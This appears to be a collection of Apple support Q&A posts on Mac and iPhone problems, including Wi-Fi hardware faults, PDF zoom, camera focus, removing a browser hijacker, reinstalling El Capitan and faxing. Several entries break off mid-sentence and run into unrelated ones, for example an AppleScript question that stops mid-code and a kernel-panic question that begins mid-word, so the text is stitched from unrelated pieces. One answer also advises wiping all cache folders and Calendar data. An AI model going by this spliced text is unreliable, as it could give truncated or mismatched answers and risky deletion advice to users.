- button) at left of the cog\n\n*Click on the Apply button\n\n*Exit Network preferences\n\n*Restart your MBP\n\n*Go to Apple > System Preferences > Network\n\n*Click on the plus sign (i.e. the + button) at left of the cog\n\n*In the pop-up window, ensure that Wi-Fi is selected from the drop-down menu\n\n*Click on the Create button\n\n*Make sure Wi-Fi is on and connected (it should remember your previous settings, but if not just re-add your Wi-Fi network again)\n\n\nLet me know how you go.\n\nA: This actually turned out to be a hardware problem. Luckily I only had to check the ribbon cable connections to the Wi-Fi card and push it on firmly to restore Wi-Fi in all three operating systems. The advice above was very helpful in ruling out software as an issue.\n\nA: Had similar situation going on with my 2011 MacBook pro. Had tried resetting PRAM & SMC, and nothing really happened. I found that I could re-start the machine and sometimes wifi worked, other times, it did not.  After reading the above information, it make perfect sense - a laptop will endure countless micro-shocks, every time it is set onto a table, there is a slight vibration. \nSo, I opened up the computer and found that the plugs are oriented to face upward and plug-in from beneath the wifi antenna. Thus, every downward shock will work against this orientation until the connections eventually become tenuous such that they only work from time to time.\nThe fix is super simple: just remove the bottom of your MacBook and unplug and replug each wire going into the wifi device.  \n", "Q: Opening a pdf file from the command line I have been using latexmk to make a pdf file in the following way:\nlatexmk -pdf filename.tex; open filename.pdf\nThis opens the pdf in Preview. However I want to open the pdf with a given zoom (problems with vision), and Preview reverts to a default zoom at every opportunity. This is annoying because I like to recompile my latex quite often.\nI have tried using \"open -a\" with both skim.app and Adobe Acrobat Reader, because I have gained the impression from reading about these pdf viewers on the web that one can change the default viewing parameters. Unfortunately, a command line such as the one above, possibly using \"open -a skim.app filename.pdf\" produces the error message that either the file or the program \"can’t be opened because it is from an unidentified developer\". This happens whether of not I tell the system (via Command-I) to always open filename.pdf with the appropriate application (skim or Reader).\nSince skim provides some kind of AppleScript access, which Preview doesn't, I wondered whether to try using AppleScript. But I need to get on with what I'm writing, rather than get into an infinite regress of things I need to learn first.\nI use vim for editing, and briefly considered vim-latex, but rejected it as too complicated to 1) install and 2) learn how to use. I want no more than to open, from the command-line, a particular pdf in a pdf viewer where one can control the parameters for viewing.\n\nA: You have a couple of problems here.\nFirst, the message \"\"can’t be opened because it is from an unidentified developer\" refers to the application.\nOpen Skim from the Finder and it will pop up a dialog telling you it is from an unidentified developer. Click on OK. Now open the \"Security & Privacy\" pane of System Preferences and under the General tab you will have the option to open the application anyway. Click \"Open\" and the app will open. You only have to do this once.\nSecond. Open a PDF in Skim and zoom it to the amount you require to be able to view it with your vision problems. Turn on or off the Contents and Notes panes as desired. Now select \"Use Current View Settings as Default\" under the PDF menu.\nNow when you open a PDF in Skim it will be at the right zoom settings so open -a Skim.app example.pdf will work for you.\n\nA: There are two ways for a PDF to be displayed with a given zoom: \n\n\n*\n\n*The application remembers window/zoom settings [for each file].\n\n*The PDF itself includes data to specify the opening behaviour.\n\n\nPreview does not remember the zoom factor (though it will open at the same page as last viewed). As stated in the other answer, other PDF viewers may have default zoom settings.\nAs you're creating your PDF from latex, you may want to look at incorporating pdfmark operators into your latex.\nThe code for the pdfmark is something like:\n[ /Dest MyZoom\n  /Page 0\n  /View XYZ NULL NULL 4\n  /DEST pdfmark\n\n4 is a zoom of 400%. Page 0 means no page is specified. \nI know nothing of latex, but a quick Google suggests it is possible to insert pdfmarks into latex.\n", "Q: How do I change focal distance in iPhone SE When I try to take a photo through  window screen, the plane of focus is the window screen rather than the things outside.  \nIs there any way to forcibly change the focal distance when every part of the field of view is covered by the window screen?  \nI want a close-up shot, of the thing outside, so stepping back from the window screen is not ideal.\nI am using an iPhone SE. On an \"old\" style camera, I would adjust the lense to change the focal distance.\n\nA: Maybe I'm misunderstanding your question, but you can force the iPhone camera to focus on a particular item/person by tapping where it's located on the screen.\nIn your case you may also want to lock the focus and exposure. You can do this by tapping and holding on the screen for about two seconds. When you do this you'll see a number of contracting rectangles around your finger and you're then free to move the camera a little while keeping it locked on a particular scene without losing focus. You'll know it's worked as AE/AF LOCK will appear on screen.  To undo this, just tap anywhere on the screen.\nYou can also zoom in to what you're wanting to capture by pinching two fingers on the screen. This will reveal a line with a positive sign (+) at one end and a negative sign (-) at the other. You can then drag along this line to zoom in/out as required.\n[UPDATE]\nI'm no photography expert, but since you've clarified you're talking about focal distance, then the iPhone SE by default isn't going to really achieve what you're looking for on its own. After all, it's not a dedicated camera per se.\nInstead you might want to consider purchasing one of the many add-on telephoto lenses for iPhone. Apple does offer the olloclip 4-IN-1 Lens which is compatible with iPhone SE models, so it may be worth checking out whether that would meet your needs.\nIf not, you may find others that meet your needs, such as from the highly regarded likes of Moment and Ztylus.\nAnother possible option would be to research 3rd party camera apps. Some of these are very highly rated and can achieve awesome enhancements over the default iOS camera app, although I can't personally recommend one in terms of focal distance.\n\nA: There is a multitude of third-party apps which allow you to manually control most aspects of the camera, including focal distance. Halide, VSCO, Manual, Camera+, and ProCam are just a few which offer this functionality.\n\nA: Borrowing heavily on Monomeeth's answer & from comments underneath...\n\nIn your case you may also want to lock the focus and exposure.

I have the following items:\n\n\n*\n\n*Macbook Pro Retina OS 10.13.4\n\n*HDMI cable\n\n*Brand new Raspberry Pi Model 3B+\n\n\nI do not possess a HDMI monitor which I could use for my raspberry pi, thus I would like to use my macbook pro for that function. \nMy raspberry pi is brand new, and has never been configured before nor connected to the internet.\nHow do I go about using my macbook pro as a monitor with a HDMI connection, so that I can set-up my raspberry pi?\n\nA: I won't say it is going to be impossible to ever use your MacBook Pro as a display for your Raspberry Pi, but I will say it will be impossible to use it as a monitor for a Raspberry Pi that's never been set up before.\nBasically there is no hardware way of making the MBP display available to another device. You can use software to do this, but then you would need to have software compatible with whatever operating system you were going to install on the Raspberry Pi. That in itself is feasible enough, but you won't be able to set things up without a display to begin with.\nIf you have no available display to use, then my recommendation would be to buy a cheap used display from a garage sale or somewhere and use that to set up the Raspberry Pi. In the end it'll save you a lot of time and frustration. Only a few months ago I picked up an old 22\" HDMI display for $5 from a garage sale and it's worked perfectly ever since.\n\nA: You're looking for a \"HDMI Video Capture\" device.\nSuper cheap and works wonderfully !\nIt turns your HDMI signal into a USB webcam basically.\nI've used this one with success (I'm not affiliated with them in any way) https://www.youtube.com/watch?v=fltt5JhodCE\n\nA: You can’t. The HDMI port on the MacBook Pros are HDMI out, not in. In addition, MacBook Pros do not support any variety of Apple’s target display mode - they cannot be used as a screen for anything.\n\nA: I think your only option is to use a blackmagic ultrastudio recorder (it has an input of hdmi or SDI, output of thunderbolt) - connect it and your device should see it as a monitor, and your laptop should see it as a live camera feed - but you wont be able to control the device.\n\nA: These are the only 2 options I can think of I don't know if they work (you might want to Google this one).\n\n*\n\n*Use Duet Display\n\n*Buy a monitor\n\nOption 1:\nThe app cost money and I don't know if it works\nOption 2:\nTry to find a cheap monitor and see if works\n\nA: Actually, there is a way. You can download a remote desktop software ( i recommend using Microsoft Remote Desktop). You will have to enter the Pi's IP address, username and password and you will have access via wifi\nHere's a link to download it from the App Store\nhttps://apps.apple.com/gb/app/microsoft-remote-desktop/id1295203466?mt=12\n", "Q: Cannot find/remove browser hijackers My roommate brought me her iMac this afternoon because it's been behaving very badly since she upgraded to High Sierra. It turns out that her boyfriend has gotten a lot of malware onto it, and I'm having real problems getting rid of it.\nThe biggest culprit is a set of browser hijackers (they may all be related, or they may be separate malware, I'm not sure), including well-known ones like G-Search.Pro, and others (feedvertizus, beleelashopper, etc).\nI cannot figure out where these things have stuck themselves to get rid of them. So far, I have:\n\n\n*\n\n*Deleted any installed applications I didn't recognize.\n\n*Installed and run MalwareBytes, which claims I have no malware.\n\n*Installed and run AVG Anti-Virus, which claims I'm clean.\n\n*Completely deleted Chrome and Firefox from the machine and reinstalled.\n\n*Checked the LaunchAgents folders in /Library, /System/Library, and /Users/user/Library for anything odd.\n\n*Checked the LaunchDemons folders in the same places.\n\n*Removed anything from Application Support folders that looked suspicious.\n\n\nAll to no avail. A clean, fresh install of Chrome immediately gets infected with G-Search.pro and these other things. I'm at my limit of OS X knowledge so I have no idea where else to look.\nWhere could these things be hiding, or where can I go (are there system logs, etc.?) to find out?\n\nA: In case anyone else gets infected by this, here's what I ultimately discovered:\nThe virus had installed a local web proxy, and a background service that was constantly monitoring the system's proxy settings and \"restoring\" them to point to itself. I discovered this when I noticed that Safari was throwing SSL warnings for everything, and that YouTube was returning empty responses and proxy errors trying to watch videos. \nThe proxy also appears to have been preventing Chrome's sync from working, and preventing me from activating several anti-virus programs that require online activation.\nI was able to find it using lsof to see what was listening on the port that kept setting itself up as the local proxy. It had installed a mono application using the Titanium web proxy NuGet package, into /usr/local/srcsrv. \nOnce I killed that, the behavior of the web browser returned to normal except for the \"New Tab\" page in Google still pointing to G-Search.pro. I haven't yet tried to delete and reinstall Chrome a second time, but I did add several domains to /etc/hosts to prevent them from phoning home. \n", "Q: Sorting (album) artist in iTunes I was wondering how to list an album as another artist's work in iTunes \"Artists\" view.\nI have an album whose artist and album artist are \"eason and the duo band\". I would like to list the album as \"Eason Chan\" by using the \"Sorting\" feature. However, the album still belongs to \"eason and the duo band\" in \"Artists\" view.\n\n\nA: The Artist and Album Artist fields display whatever is recorded in the metadata. In this case, both of these fields contain eason and the duo band.\nThe only way to change what is displayed is to actually change what is recorded. Your screenshot shows that you already know how to access the metadata (i.e. using the Get Info/Song Info option or pressing commandI) to bring up the details. \nYou would need to do that and actually change the information stored there. To do this, make sure you're on the Details tab and edit the info in Artist and/or Album Artist. Once you've clicked OK to save the data, you'll find what is displayed for these songs/albums will also change.\nAs for the Sort As field, this dictates which field iTunes will use to sort the information, not what is actually displayed in the fields.\n", "Q: AppleScript added value inside text Let say I have the following text file : \n\n  \n*\n  \n*DEMO\n  \n*TEXT1\n  \n*TEXT2\n  \n*DEMO\n  \n*etc....\n  \n*DEMO\n  \n*TEXT1\n  \n*TEXT2\n  \n*DEMO\n  \n*etc....\n  \n*DEMO\n  \n*TEXT1\n  \n*TEXT2\n  \n*DEMO\n  \n*etc....\n  \n\nI would like to added some text between the first TEXT1 and TEXT2 (line 2/3)\nso the text would be like :\n\n  \n*\n  \n*DEMO\n  \n*TEXT1 MY TEXT HERE\n  \n*TEXT2\n  \n*DEMO\n  \n*etc....\n  \n*DEMO\n  \n*TEXT1\n  \n*TEXT2\n  \n*DEMO\n  \n*etc....\n  \n*DEMO\n  \n*TEXT1\n  \n*TEXT2\n  \n*DEMO\n  \n*etc....\n  \n\nI know how I can filter the text to get the value of any text that would be there with the code bellow, but how can I add some text on my text file at this empacement ?\nproperty leftEdge1 : \"2.

crash? I've the kernel panic several days a month.\n\nA: Kernel panics are generally not supposed to happen.\nIt can be impossible to determine the cause of a single kernel panic. They can be related to kernel bugs, version incompatibility, driver bugs and/or hardware problems.\nAs you have often recurring kernel panics, you should save the text of many of these kernel panics. Then you can compare them to each other to find a common thread, if any. For example, in this case the current process is coreduetd - is that always the case when it crashes? (then that could be the cause, although that would be due to Apple bugs).\nThe general error described in this kernel panic is a page fault - i.e. the kernel trying to access memory that isn't mapped for access by the kernel. This is due to kernel bugs or hardware error.\nIf it is always page faults, but various processes and device drivers - then that is an indication of either flawed OS installation or hardware error.\nIn your case I would recommend running the system for an extended period of time without any external devices of any kind plugged in (besides those necessary for the system to function obviously). If the kernel panic still occurs, that's a great data point.\nIn that case start the Mac in Recovery mode (hold down Cmd-R when booting). If kernel panics still happen in Recovery mode, it is much less likely that the problem is related to your software installation. Instead it is likely caused by hardware errors.\nHardware errors that cause page faults are usually defective RAM modules or lack of proper cooling. Check that fans are working properly, exhausts are not covered and temperature is nominal. If your computer has replaceable memory, try running with only one memory module plugged in. If crashes still occur, swap with another module.\nHopefully this should allow you to determine the true cause of the panics.\n", "Q: I can't see Google Calendar on macOS Calendar app I have had some sync issue with my Google calendars and my iPhone / iPad / macOS calendar app, so I have decided to try to fix it. \nI removed / added my Google Account from my iPhone and now I can see the calendar without issue. The problem is with Calendar desktop application (on macOS). \nI followed all the instructions but while I can see Google listed on iCal, I can't see my Google calendars (check the picture). \n\nI've tried all the instructions on Google's support pages but without success. \nWhat else can I do to fix this issue?\n\nA: Did you try to move your cursor over the \"Google\" label (shown in your screenshot) to check if you did not accidentally tap the \"hide\" button which only appears in this situation? There should be a \"show\" option appearing if your Google account is functional.\n\nEdit:\nIf previous didn’t work try to quit Calendar and to delete device caches:\n\n\n*\n\n*In Finder click on the \"Go\" menu, hold alt and tap \"Library\"\n\n*Go to \"Caches\" and remove all folders\n\n\nThen remove Calendar data:\n\n\n*\n\n*While still in \"Library\" folder remove all files and folders in \"Calendar\"\n\n\nBe sure to backup this last folder before doing anything as it contains your personal data. Launch Calendar app and see if it worked, if not do not forget to refill Calendar data with your backup.\n\nA: This is a pretty bad problem that Apple hasn't fixed yet. You need to delete the calendar cache, see here on how to do that.\nThis worked for me.\n\nA: In my case the workaroud was to go to System Preferences > Internet Accounts and click on the relevant accounts that were not syncing. Turns out even though the accounts were listed there (and in the Calendar app), the accounts were not authenticated and just needed a password.\n\nA: You need to tick the calendar in your synchronization settings.\n\nA: I just landed on this post from a google search after this exact issue. What solved it for me was simply selecting the google calendar as default. The other answers didn't lead to it showing up.\n", "Q: Can I view hidden files and directories from the Open or Save As dialog boxes without making them visible in the Finder? I know you can use Terminal to switch on/off hidden files in OS X and already use these commands.\nWhat I want to know is if it’s possible to just do this from WITHIN the Open or Save As dialog boxes so I can navigate and access hidden files when I need to. I seem to find myself using Terminal to switch hidden files on/off a few times a day, but this is getting monotonous.\nWhat I would like is to just be able to do this while saving or opening files but without affecting the Finder afterwards. That way I wouldn’t need to use Terminal all the time to switch it off/on again. I just don’t like seeing the hidden files normally when in the Finder, but do need to regularly see them when opening/saving files.\nIs there an Apple Script or some way of doing this?\nI mainly need to do this when using MS Office programs, so a Visual Basic macro would suffice too. But a native Apple solution would be preferable as I do sometimes need to be able to do this in Text Edit too.\n\nA: You don’t need an Apple Script or Visual Basic macro to do this as you can do it using a simple keyboard shortcut from within the Open or Save As dialogue windows. Using MS Word as an example:\n\n\n*\n\n*In MS Word go to File > Open… or File > Save As…\n\n*When the window opens press the shift⌘ .  keys to toggle the display of hidden files on\n\n*Now you’ll be able to see hidden items and, if supported by the application you’re using, select them as well\n\n\nNot only does this approach have no effect on the Finder, it also automatically toggles hidden files off again once you've saved or opened the file. In other words, the next time you’re in one of those dialog windows you won't see hidden files unless you want to (in which case you'd just use the shortcut again).\nNOTE: The above keyboard shortcut also works within the Finder to toggle hidden files on or off more generally. Of course, if you’re using it within the Finder then the setting remains until you change it again.\n", "Q: Hide all files of the same extension in Finder I need to hide all files with .pek extension on Finder (macOS Sierra) automatically.\n\nA: OK I've changed the Peter Hosey's fs-notifier, so that it will set the newly created .pak files hidden.

I tried to figure out how to add a new definition but it didn't seem to help.\n", "Q: Back up only actual files in directory structure I want to backup my savegames:\n+ /Library/Containers/com.doublefine.dfaosx/***\n+ /Library/Containers/com.doublefine.dottosx/***\n\nI initially wanted to do this as part of a larger rsync backup. However, because of some macOS sandbox insanity, the folders include dozens of symlinks that I don't want to backup up, and excluding these has proven difficult with rsync (see related question).\nHow can I backup only the valuable savegame files and exclude the symlinks, without explicitly specifying a lot of subfolders. I want to specify \"Back up all real files under this root folder, excluding symlinks and subfolders that don't ultimately contain a real file\".\nI tried zip also, but it doesn't even seem to have an option to exclude symlinks. Can tar do it? It would be best if rsync can do it, but if not, any standard Unix tool would be acceptable.\nThe files I want to backup are as below.

You'll need to call ‘save’ if you want to save your changes, or use the GUI with your opened document.\n\n\n*\n\n*You need to tell the application that provides the trim operation. Wrap your trim operation in a ‘tell application’ block, which in this case is to tell QuickTime Player.\n\n*The trim operation takes a document and start & end points. The document is not a file name, but a document open in QuickTime Player. document 1 refers to the first document open.\n\n\n*Rather than hardcoded start and end points, you can get the duration from the video and take 2 seconds off the end to be used as the end point. This is what the d variable is used for in the code above.\n", "Q: I can't enter passwords in Safari 11.1 on macOS 10.13 High Sierra because the last character gets removed I installed a brand new 10.13 a few days ago. I downloaded it from the App Store and I installed all updates. I'm runnning Safari Version 11.1 (13605.1.33.1.4).\nSomehow I managed to log into Google, but I can't log into any other website.

I would like to remove, or barring that, black out, the right-most 30 pixels from my movie.  How can I do that on Mac using freeware tools?\n\nA: There is a free video conversion tool available on Mac, Windows and Linux called Handbrake.

I erased my drive and wanted to reinstall OS X El Capitan. After I agreed to the terms then selected my drive I signed into the Apple store. I put the confirmation code in from my phone and it said “This item is temporarily unavailable Try again later”. I tried restarting it and trying then shutting it down and trying but it still won’t work.\n\nA: This process worked on 2022-05-08\nI was trying to do a clean install for an Early 2009 27\" iMac.  The recovery console listed El Capitan as the available OS, but trying to do an Internet-based recovery continually failed with a message similar to \"Couldn't Install. No viable modules\"\nI tried to follow suggestions on other sites, but the \"Download old versions of Mac OS\" threads are no longer valid for El Capitan.  It appears that Apple has removed El Capitan from their installer download page -- they only have the Safari-only update feature, which did not meet my needs.\nI stumbled on a secondary thread that someone mentioned Apple removes support for these downloads when the security certificates expire.  That made sense to me so I had an idea to set the computer's date back to a time that the security certificate would have been valid -- and that worked!\nHere is the actual procedure that worked, using the Internet-based Recovery:\n\n*\n\n*After start chime, hold CMD+Shift+R until the start up progress bar shows\n\n*When the Recovery Console is shown, click the WiFi icon in the top-right and join a valid network\n\n*On the top-toolbar, select Tools -> Utilities -> Terminal\n\n*With the terminal open, set the date back.  I used the command: \"date -u 0101000013\" to set the system date to 01-01-2013 00:00\n\n*I then clicked the Reinstall El Capitan from the Recovery Console Menu.\n\nWhere before it would fail after about 22% completion, this time it completed successfully without any intervention.  I was then able to enter the Select Country Screen and continue completely with the setup.  Once installed, the date can be changed back.\n\nA: I ran into this issue myself.  NoahL's comment is spot on: try Internet Recovery (Command+Option+R).\nI was trying to reinstall macOS on a laptop.  The on-disk recovery kept giving me this error message after I gave it my AppleID in the reinstall wizard:\nThis item is temporarily unavailable.\nTry again later.\n\nI retried two weeks later, and still got the same error.\nI found this thread and tried out Internet Recovery and I was able to reinstall macOS.\n\nNote: I had to erase the disk with Disk Utility before Internet Recovery would let me reinstall macOS, because the version on disk was newer than the version that will be installed.\n(I don't know why Internet Recovery doesn't just offer the latest macOS...)\n\nA: If you are getting the answer to this question, dear friends, here's the answer: I hope it will help you.\n\n\n*\n\n*The first thing you will know is the right thing; device is using the apple ID you used previously. you may receive this error because of a different apple ID. if you don’t remember your old apple id, please format it with usb in the last article.\n\n\n*Check the time of your device first. If the time date is wrong, open the mac terminal and correct the time date with the date command. If the date is incorrect, you’ll also often get the following error: An error occurred while preparing the installation, Try running this application again. these two errors may be due to time-date error.\n\n\n*Try opening your apple account at icloud.com in the online help on the setup screen.\n\n\n*\n\n*https://www.knowerstech.com/fix-macos-this-item-is-temporarily-unavailable-please-try-again-later-error/\n\nA: Process:\n\n*\n\n*I created a USB disk with a bootable El Capitan as per this documentation.\n\n*Plug-in your USB key on a turned-off computer.\n\n*Start your Mac, press immediately OPTION (aka ALT)\n\n*Select the Orange icon (aka a USB stick) labelled El Capitan.

Reboot and redo the process with Safari first then the Install.\n\n*I am unsure, but you might need to wipe the whole disk to not have any partitions available (that means Recovery HD and Macinstosh HD, using the default names)\n\nPS: The above work for me on a Macbook Pro 2009 and Maverick but I could not reinstall Maverick due to an itunes login to old and incompatible with the security code that Apple uses now... Hence straight to El Capitan which supports the security code (via the https://icloud.com login;). That said, in hindsight, the same trick could have worked with Maverick too using the recovery partition...\n", "Q: How can I find all selfies taken on my iPhone when on my computer? Since iOS 9, the iPhone has had a default album called Selfies that gathers all the selfies you've taken on the device (i.e. all the photos taken with the front-facing camera) in one place. This makes it easy to browse through and manage your selfies on the device itself, but I want to be able to do so after uploading the photos to my computer (such as via iCloud Photos or by manually copying the images in Windows Explorer). \nIs this possible? Is there any sort of metadata in the copied photo that indicates that an image was taken with the front-facing camera, or is this information completely stripped once the image is outside of the device itself?\n\nA: You should give a try to the Google Photos Apps. I use this app, and it's so good because all the photos are automatically classified. And you will have a selfie Album that will gather all your selfies ;) \n\nA: This sounds like a question about searching for files in Windows, which is off-topic for this site. That said, Windows does support searching for EXIF metadata natively, which is where the front- vs. rear-facing camera information is stored, so I expect you can use that to your advantage.\nIf anyone is reaching this page from a search, and is using a Mac: you can easily achieve this by selecting “Selfies” under the “Media Types” album in the Photos app.\n", "Q: How to unzip .xz How can I unzip a .xz file?\nArchive utility failed.\nIs there an app that I should get to do it?\n(Mac Pro, OS X Yosemite 10.10.5)\n\nA: I would give The Unarchiver a go. You can download it directly or, if you prefer, via the Mac App Store.\nNote: I am not affiliated with this product. \n\nA: In Mavericks (10.9.5), you can use gunzip in a terminal to extract .xz files - so it is sure to also work on Yosemite.\n\nNote: The library liblzma is required to extract .xz files.\nPrior to Mavericks, .xz can not be extracted by the native gunzip on OS X because this library is not present. For example, OS X Mountain Lion does not have /usr/lib/liblzma.dylib, nor /usr/lib/liblzma.5.dylib, see this post and the table from this post.\nThis post states:\n\nAs this StackOverflow answer rightly points out, the xz/lzma feature of bsdtar is configurable at compile time. The feature is present back to macOS 10.7, but it is configured off until macOS 10.9.\n\nAlso of interest, from this post:\n\nFound some info about OS X and libarchive versions. According to this: https://opensource.apple.com/\nOS X 10.6.x shipped with libarchive 2.6.2. And OS X 10.7.x shipped with libarchive 2.8.3.\n(2.8.3 is still used in Mojave, albeit with various, minor-looking, darwin-specific patches accumulated over the years if I understand correctly. For example, see libarchive.plist from macOS Mojave 10.14.5 for details.)\n\nFor more information, read this thread:\nXZ compression support #8\n", "Q: I would like to fax from my Mac running High Sierra I need to fax a couple of pages from my Mac. My printer doesn't seem to support faxing. I found one online site that will fax from a mac but they wanted a monthly subscription starting at $12.95 a month. Is there another way to fax without going somewhere that will fax for me? \n\nA: Assuming you don't want to upgrade your printer, buy/borrow a fax machine or pay for an online service, then the only remaining options are:\n\n\n*\n\n*print the pages and take them somewhere to fax for you\n\n*find an online fax service with a free trial period\n\n*use a fax modem1 if you happen to have an old one laying around\n\n\nIf this is a once off I would just print the pages and take them to your workplace or a local post office (or anywhere that has a fax machine) and ask if they can fax them for you. Even if they charge a couple of dollars, this is probably the best option.\nOtherwise you should be able to find an online fax service with a free trial period. I just did a quick search and found that https://en.efax.com offers a 30 day trial period. No doubt you will need to provide payment details as part of the registration, but typically with these types of services you can just contact them and cancel your account prior to the trial period ending.\n1. macOS Sierra doesn't natively support fax modems but there used to be a range of 3rd party fax programs, so you could use one of these. Or maybe just use another computer or install El Capitan on a virtual machine to do this. Or, if you happen to have Windows installed (either via Bootcamp or a virtual machine), that should do the trick too.\n", "Q: Can I control the order of keyboard layouts in the system menu? I have a few keyboard layouts or \"input sources\" as the system calls them. The system also lets you define a keyboard shortcut for \"Select next source in Input menu\". \n\nI had muscle memory of how many times to hit that key combo to go between various keyboards. Then after a reboot they are now in different order. Is there a way to set the order so it doesn't change? \n\nA: Since you're using more than two input sources you'd be better off configuring a specific shortcut for each input source.\nWithout knowing the exact version of macOS you're running, there are a number of tools you could use to achieve this:\n\n\n*\n\n*IMEShortcuts\n\n*MLSwitcher2\n\n*Karabiner\nMy suggestion would be to create the same shortcut and use digits (i.e. 1, 2, 3, and 4) to differentiate them.\n", "Q: Finder not searching files in ~/Library and /Library I am using a Macbook Air with macOS High Sierra. \nWhen I install a third party application and later delete it, I have to remove files stored by it in Application Support, Preferences etc. in ~/Library. I have to manually look up and delete files containing the name of the third party app (eg. com.EaseUsMobiMover installed by MobiMover). \nWhy doesn't Finder show these files when I search for them? And how do I make Finder search for all files containing the name of the app like com.abc for the app \"abc\"?\n\nA: You have to include \"System Files\" in your criteria to search places like the user Library.\n\nTo do so, open a search window in Finder cmdF, click on \"Kind\" and select \"Other\" and scroll down to \"System Files\".  Tick the box under \"In Menu\" for easier access in the future by including it in the search menu.\n(You can also specify hidden files here, with the \"File invisible\" attribute)\n\n\nYou can also save those search criteria and add them to the Finder sidebar for quick access.\n\nIf the above does not yield the desired results, a rebuild of the Spotlight index might be required.\n\nA: I don't know why Finder will not search hidden & System folders, but it won't.\nThe simplest workaround is to use something like EasyFind - freeware - which will search anywhere you tell it.\n", "Q: Macbook pro touch bar spoiled with kernel panics After dropping my macbook pro, my touch bar has stopped working and I am getting frequent kernel panics\nDoes anyone have any idea how to solve this or which part of the macbook is faulty? \nThank you!\n\nA: Since you've dropped it the first thing you should do is run some hardware diagnostics.\nRun Apple Diagnostics\nFollow the steps below to run Apple Diagnostics:\n\n\n*\n\n*Fully shut down your MBP\n\n*Restart your MBP\n\n*Immediately press the D key and keep it down until you see the Diagnostics screen appear\n\n*Wait for Diagnostics to finish (this typically only takes a few minutes)\n\n*Once complete, one of two things will appear on the screen:\n\n\n*\n\n*a No issues found message\n\n*a brief description of any errors found plus further instructions\n\n\n*If the diagnostics test does find errors, take a note of what they are\n\n\nNote: If pressing and holding the D key at Step 3 doesn't work, start again at Step 1 and, at Step 3 press and hold both the OptionD keys instead.

This is not a network issue because Android or non smart phones do get delivery reports.\nAs far as I have read, there is no way to turn on this feature on iMessage for normal SMS. Is there any other app that I can use to send normal SMS from iPhone that can show delivery reports? \nDo note that I am not asking for apps that require data connection. I am just looking for any alternate program for sending network based SMS.\nA related question has been asked about four years ago here at How can i get delivery confirmation for sent sms? . However, there no way out could be found.\n\nA: Firstly, you can't send a normal SMS using iMessage since they are completely different messaging services even if both can be sent from the iPhone Message App. iMesssage only relies on iCloud account and internet access (Wifi is sufficient) while SMS requires a SIM card that is functional and access to your carrier network (and not necessary GPRS, 3G, 4G...).\nSecondly, it is not a network issue or a bug to not receive delivery report for SMS on iPhone as Apple never provided such service (as far as i know). Moreover there is no alternative app to deal with SMS and delivery report on iOS (while it is possible on Android OS). As far as I know alternative SMS apps are not allowed by Apple (only instant messaging apps are allowed, that are apps using a cellular connection i.e. 3G, 4G and so on).\n\nSUMMARY\nThere is no option to enable SMS delivery report on iPhone and there is no app that can achieve this goal because it is not allowed by Apple.\nNote:\nBack in the days when jailbreak was quite common a solution used to exist but jailbreak is not recommended and may be hard to achieve on recent OS.\n", "Q: Stuck after entering login user password so, i am using macbook pro 13”2017with touchbar and using the latest version of macos high sierra just today when i tried to open my macbook, entering login password as normally i got into my mac and then it hangs after i tried to open chrome.

I have been having Internet connection issues for weeks and my ISP sent me a new Modem/Router today, but the issues are still there. The tech has opened up an online case I can respond to and attach screenshots if need be.\nNow the tech is asking me for the RSSI, Noise and TX Rate values.\nHow do I get these details? And are they safe to give to him?\nI’m using an iMac with macOS High Sierra installed.\n\nA: Yes, those details are safe to provide. They are measurements of the quality of your wireless signal, and they contain no personal information.\nYou can view these and other details from the Wi-Fi icon in the menu bar. The trick is to press and hold the option key while you click on the icon (i.e. make sure you’re pressing the option key first before clicking on the menu bar). If you do you’ll see these values and more. \n[UPDATE]\nPrompted by Gordon Davisson's comment, this update adds more information about the options available under the Wi-Fi menu.\nAs mentioned previously, by holding down the option key while you click on the Wi-Fi icon you'll be able to see the values you were after and more. Some additional options include:\n\n\n*\n\n*Enable Wi-Fi Logging\n\n*Create Diagnostics Report...\n\n*Open Wireless Diagnostics...\n\n\nFor a broad overview of these options you can refer to Check for Wi-Fi issues using your Mac.\nIn summary, however, selecting the Open Wireless Diagnostics... option will launch an application that helps users to diagnose common issues with their Wi-Fi connection. Note: This refers to your Wi-Fi connection and not your internet connection per se, although not having internet access on a device could be in fact related to your Wi-Fi connection.\nWhile you can run through the Assistant that opens when you first launch Wireless Diagnostics, you can choose to ignore this and manually access additional utilities available under the Window menu (or by using the relevant optioncommand shortcut). One of the best things about this is you can actually open all of them simultaneously if you want to.\nBy using the Performance utility you'll get graphs of those values over time (along with \"Quality\", which is just the difference between RSSI and Noise). You can use these graphs to gauge how they change as a result of certain actions (e.g. moving your computer, checking to see how Noise reacts when using a microwave or cordless phone, etc). This is particularly handy to keep open so you can monitor it if you're having problems.\n\nA: Just in case there's a need for command-line usage, there's the not-so-easy-to-access airport utility:\n$ /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I\n     agrCtlRSSI: -48\n     agrExtRSSI: 0\n    agrCtlNoise: -101\n    agrExtNoise: 0\n          state: running\n        op mode: station\n     lastTxRate: 145\n        maxRate: 144\nlastAssocStatus: 0\n    802.11 auth: open\n      link auth: wpa2-psk\n          BSSID: xx:xx:xx:xx:xx:xx\n           SSID: test\n            MCS: 15\n        channel: 12\n\n", "Q: Mac Pro with permanently mounted Time Machine.

I also replace the Time Machine drive units from the RAID boxes every two years as they run 24/7. I use Guardian MAXimus from OWC*, which are easy to self service.

Every feature is design in this purpose: moments, collections, faces, locations as well as shared albums and ... memories!\nI'm afraid you only have few solutions available including turning of memories notifications you mentioned (and never tap the memories album again). If you don't want [your] professional environment besmirched by 'social media'-type actions you may have to choose a different photo app to separated your professional and private life.\nConcerning the algorithms behind memories, it is obviously based on similarly between groups of photos (location, date, people...). From my personal experience 2 différents types of memories are highlighted by the App: \n\n\n*\n\n*Regular memories that gather photos from a recent event (a trip, a week-end, a party). They are usually pushed froward few weeks after the event ends.\n\n*Special memories that are usually highlighted many month (sometimes years) after the event ends. Such memories could contain only photos of a specific person (the memory titles \"[Person X] over the years\", \"[Person X] birthday\", [Person X]'s Home) or photos taken a specific amount of time ago (a have a \"5 years ago\" one, here are some other examples: \"last Winter\", \"On this Day\", \"Chrismas day\", \"Halloween\" and even \"Best of Last Week/Mounth/Year\").\n\n\nI guess that you dislike this second category. This is quite intrusive I reckon but Photos App IS a social App since Apple designed to encourage photo sharing and viewing between family and friends rather than for professional use.\n\nA: I love the idea of Photos automatically creating an album of Mr Boots, so I don't have to.

